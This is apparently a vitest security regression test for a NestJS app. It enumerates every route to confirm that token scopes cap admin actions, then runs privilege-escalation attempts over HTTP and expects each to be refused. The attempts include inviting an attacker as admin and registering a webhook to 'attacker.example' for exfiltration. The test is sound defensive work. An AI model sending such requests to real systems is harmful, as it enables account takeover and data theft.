import 'reflect-metadata';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { ModulesContainer, Reflector } from '@nestjs/core';
import { eq } from 'drizzle-orm';
import type { NestFastifyApplication } from '@nestjs/platform-fastify';
import { createTestApp } from './helpers/app';
import { authed, signUpUser } from './helpers/users';
import { connectTestDb } from './helpers/db';
import { platformAdmins, user } from '../src/db/schema';
import { requiredTokenScope } from '../src/auth/auth.guard';
import type { ReflectTargets } from '../src/auth/auth.guard';
import { MIN_ROLE_KEY } from '../src/workspaces/workspace-access.guard';
import { SESSION_ONLY_KEY } from '../src/auth/token-scope.guard';

/**
 * #1049 — a token's scope is a ceiling, but the ceiling was never applied to the ADMIN ROLE: a route that needs an admin only asked
 * whether the token's owner is one. So an admin's "write, no schema changes" token could invite an attacker as admin, add grants or
 * create an exfiltrating webhook; a READ token of an admin read the audit log; and a platform admin's token of any scope operated
 * /admin (no `:ws`, so no workspace binding either). Two halves: every route is enumerated (so a NEW admin route or account-level
 * route cannot slip past), and the attacks are run over HTTP.
 */
const METHODS: Record<number, string> = { 0: 'GET', 1: 'POST', 2: 'PUT', 3: 'DELETE', 4: 'PATCH' };

interface Route { key: string; method: string; path: string; controller: string; guards: string[]; minRole?: string; handler: ReflectTargets[number]; cls: ReflectTargets[number] }
let app: NestFastifyApplication;
let routes: Route[] = [];
const { db } = connectTestDb();

beforeAll(async () => {
  app = await createTestApp();
  for (const m of app.get(ModulesContainer).values()) {
    for (const c of m.controllers.values()) {
      const cls = c.metatype as (new (...a: never[]) => unknown) | null;
      if (!cls) continue;
      const base: string = Reflect.getMetadata('path', cls) ?? '/';
      for (const name of Object.getOwnPropertyNames(cls.prototype)) {
        const fn = cls.prototype[name as keyof typeof cls.prototype] as unknown;
        if (typeof fn !== 'function' || name === 'constructor') continue;
        const method = Reflect.getMetadata('method', fn);
        if (method === undefined) continue;
        const sub: string = Reflect.getMetadata('path', fn) ?? '/';
        let path = `/${base}/${sub}`.replace(/\/+/g, '/').replace(/(.)\/$/, '$1');
        const excluded = path === '/' || path === '/build-info' || path.startsWith('/healthz') || path.startsWith('/api/docs');
        if (!excluded) path = `/api/v1${path}`;
        const guards = [...(Reflect.getMetadata('__guards__', cls) ?? []), ...(Reflect.getMetadata('__guards__', fn) ?? [])].map((g: { name: string }) => g.name);
        routes.push({ key: `${METHODS[method]} ${path}`, method: METHODS[method]!, path, controller: cls.name, guards, minRole: Reflect.getMetadata(MIN_ROLE_KEY, fn) ?? Reflect.getMetadata(MIN_ROLE_KEY, cls), handler: fn as ReflectTargets[number], cls: cls as ReflectTargets[number] });
      }
    }
  }
}, 120_000);
afterAll(async () => { await app.close(); });

describe('#1049 every route, enumerated', () => {
  const reflector = new Reflector();

  it('sanity: a real route table', () => expect(routes.length).toBeGreaterThan(300));

  it('EVERY @MinRole(\'admin\') route requires an ADMIN-scoped token, whatever its method', () => {
    const admin = routes.filter((r) => r.minRole === 'admin');
    expect(admin.length, 'the enumeration found the admin routes').toBeGreaterThan(30);
    const weak = admin
      .map((r) => ({ r, need: requiredTokenScope(reflector, [r.handler, r.cls], r.method) }))
      .filter((x) => x.need !== 'admin')
      .map((x) => `${x.r.key} needs only '${x.need}'`);
    expect(weak, `admin-role routes a write/read token of an admin could reach:\n${weak.join('\n')}`).toEqual([]);
  });

  it('routes WITHOUT the admin role keep the old ladder: GET reads, everything else writes', () => {
    const wrong = routes
      .filter((r) => r.minRole !== 'admin' && !Reflect.getMetadata('storyos:tokenScope', r.handler) && !Reflect.getMetadata('storyos:tokenScope', r.cls))
      .filter((r) => requiredTokenScope(reflector, [r.handler, r.cls], r.method) !== (r.method === 'GET' ? 'read' : 'write'));
    expect(wrong.map((r) => r.key)).toEqual([]);
  });

  /**
   * An account-level route (authenticated, no `:ws`) has no workspace binding to apply, so each one is a decision a token either may
   * or may not make. This list is the decision. A NEW such route fails the test below until someone adds it here (token may call) or
   * marks it @SessionOnly().
   */
  const TOKEN_MAY_CALL = new Set([
    'GET /api/v1/capabilities', 'GET /api/v1/me', 'GET /api/v1/me/ai-connections', 'GET /api/v1/packs/marketplace', 'GET /api/v1/packs/marketplace/:slug',
    'GET /api/v1/packs/registry', 'GET /api/v1/packs/registry/:slug', 'GET /api/v1/templates', 'GET /api/v1/users/me/preferences', 'GET /api/v1/workspaces',
    'GET /api/v1/users/:id/avatar',
  ]);
  /** These refuse a token themselves, in their own handler (assertSession); the list keeps that on the record. */
  const SELF_GUARDED = new Set(['POST /api/v1/me/tokens', 'DELETE /api/v1/me/tokens/:token', 'DELETE /api/v1/me/ai-connections/:id', 'GET /api/v1/oauth/consent', 'POST /api/v1/oauth/consent']);

  it('every account-level (no :ws) authenticated route is explicitly SESSION-ONLY, token-callable or self-guarded', () => {
    const account = routes.filter((r) => r.guards.includes('AuthGuard') && !r.path.includes(':ws') && !r.path.startsWith('/api/v1/admin'));
    const undecided = account.filter((r) => !TOKEN_MAY_CALL.has(r.key) && !SELF_GUARDED.has(r.key) && !Reflect.getMetadata(SESSION_ONLY_KEY, r.handler) && !Reflect.getMetadata(SESSION_ONLY_KEY, r.cls)).map((r) => r.key);
    expect(undecided, `Account-level route(s) with no decision about tokens. Add to TOKEN_MAY_CALL here, or mark @SessionOnly():\n${undecided.join('\n')}`).toEqual([]);
    // The two oauth/consent routes land with #1030 (a separate PR): listed here so the order the two merge in does not matter.
    const LANDS_WITH_1030 = new Set(['GET /api/v1/oauth/consent', 'POST /api/v1/oauth/consent']);
    const dead = [...TOKEN_MAY_CALL, ...SELF_GUARDED].filter((k) => !LANDS_WITH_1030.has(k) && !routes.some((r) => r.key === k));
    expect(dead, 'decisions about routes that no longer exist').toEqual([]);
  });

  it('every /admin route sits behind PlatformAdminGuard', () => {
    const admin = routes.filter((r) => r.path.startsWith('/api/v1/admin'));
    expect(admin.length).toBeGreaterThan(5);
    expect(admin.filter((r) => !r.guards.includes('PlatformAdminGuard')).map((r) => r.key)).toEqual([]);
  });
});

describe('#1049 the attacks, over HTTP', () => {
  let session: string;
  let ws: string;
  let readPat: string, writePat: string, adminPat: string;
  const as = (token: string, method: string, url: string, payload?: unknown) =>
    app.inject({ method: method as never, url: `/api/v1${url}`, headers: authed(token), payload: payload as never });
  const mint = async (scope: string) => (await as(session, 'POST', '/me/tokens', { name: `pat-${scope}`, workspace_id: ws, scope })).json().token as string;

  beforeAll(async () => {
    const u = await signUpUser(app, 'Scope Admin');
    session = u.token;
    ws = (await as(session, 'POST', '/workspaces', { name: 'Scope WS' })).json().id;
    readPat = await mint('read'); writePat = await mint('write'); adminPat = await mint('admin');
    const me = await db.query.user.findFirst({ where: eq(user.email, u.email) });
    await db.insert(platformAdmins).values({ userId: me!.id, grantedBy: null }).onConflictDoNothing();
  }, 60_000);

  const skill = (name: string) => ({ name, description: 'd', when_to_use: 'w', instructions: 'i' });

  it('a WRITE token of an admin cannot invite, grant, change the workspace or create a webhook: 403 each, and nothing changed', async () => {
    const before = (await as(session, 'GET', `/workspaces/${ws}/webhooks`)).json().data.length;
    for (const [method, url, body] of [
      ['POST', `/workspaces/${ws}/invites`, { email: 'attacker@example.com', role: 'admin' }],
      ['PATCH', `/workspaces/${ws}`, { name: 'Pwned' }],
      ['POST', `/workspaces/${ws}/webhooks`, { url: 'https://attacker.example/hook', events: ['record.created'] }],
      ['POST', `/workspaces/${ws}/grants`, { role: 'admin' }],
    ] as const) {
      const res = await as(writePat, method, url, body);
      expect(res.statusCode, `${method} ${url}: ${res.body}`).toBe(403);
      expect(res.body).toContain('write-scoped');
    }
    expect((await as(session, 'GET', `/workspaces/${ws}/webhooks`)).json().data.length, 'no webhook was created').toBe(before);
    expect((await as(session, 'GET', `/workspaces/${ws}`)).json().name, 'the workspace was not renamed').toBe('Scope WS');
    const invites = await as(session, 'GET', `/workspaces/${ws}/invites`);
    expect(JSON.stringify(invites.json()), 'the attacker was not invited').not.toContain('attacker@example.com');
  });

  it('a READ token of an admin cannot read the audit log (the GET rule: admin routes need an admin-scoped token, GET included)', async () => {
    const res = await as(readPat, 'GET', `/workspaces/${ws}/audit-log`);
    expect(res.statusCode, res.body).toBe(403);
    expect(res.body).toContain('read-scoped');
    expect((await as(writePat, 'GET', `/workspaces/${ws}/audit-log`)).statusCode, 'write is not admin either').toBe(403);
  });

  it('an ADMIN token and a SESSION still do what they could: nothing legitimate broke', async () => {
    expect((await as(adminPat, 'GET', `/workspaces/${ws}/audit-log`)).statusCode).toBe(200);
    expect((await as(adminPat, 'PATCH', `/workspaces/${ws}`, { name: 'Renamed by admin token' })).statusCode).toBe(200);
    expect((await as(session, 'GET', `/workspaces/${ws}/audit-log`)).statusCode).toBe(200);
    expect((await as(writePat, 'POST', `/workspaces/${ws}/skills`, skill('ordinary write'))).statusCode, 'an ordinary write is still a write').toBe(201);
    expect((await as(readPat, 'GET', `/workspaces/${ws}/skills`)).statusCode).toBe(200);
  });

  it('a platform admin\'s token of ANY scope cannot use /admin; the same person\'s session can', async () => {
    for (const [name, pat] of [['read', readPat], ['write', writePat], ['admin', adminPat]] as const) {
      const res = await as(pat, 'GET', '/admin/overview');
      expect(res.statusCode, `${name}: ${res.body}`).toBe(403);
      expect(res.body).toContain('signed-in session');
    }
    expect((await as(session, 'GET', '/admin/overview')).statusCode).toBe(200);
  });

  it('a workspace-bound token cannot reach outside its workspace through account-level routes: create a workspace, accept an invite, edit the profile', async () => {
    for (const pat of [readPat, writePat, adminPat]) {
      const made = await as(pat, 'POST', '/workspaces', { name: 'Escaped' });
      expect(made.statusCode, made.body).toBe(403);
      expect((await as(pat, 'POST', '/invites/accept', { token: 'x'.repeat(20) })).statusCode).toBe(403);
      expect((await as(pat, 'PATCH', '/users/me/preferences', { dismissed_hints: [] })).statusCode).toBe(403);
      expect((await as(pat, 'GET', '/me/tokens')).statusCode, 'listing the person\'s tokens is theirs alone too').toBe(403);
    }
    const all = (await as(session, 'GET', '/workspaces')).json() as Array<{ name: string }>;
    expect(all.map((w) => w.name), 'no workspace was created by a token').not.toContain('Escaped');
    expect((await as(session, 'POST', '/workspaces', { name: 'Made by a person' })).statusCode, 'a session still can').toBe(201);
  });

  it('what a token legitimately uses at the account level still works', async () => {
    expect((await as(readPat, 'GET', '/me')).statusCode).toBe(200);
    expect((await as(readPat, 'GET', '/workspaces')).statusCode).toBe(200);
    expect((await as(readPat, 'GET', '/templates')).statusCode).toBe(200);
  });
});
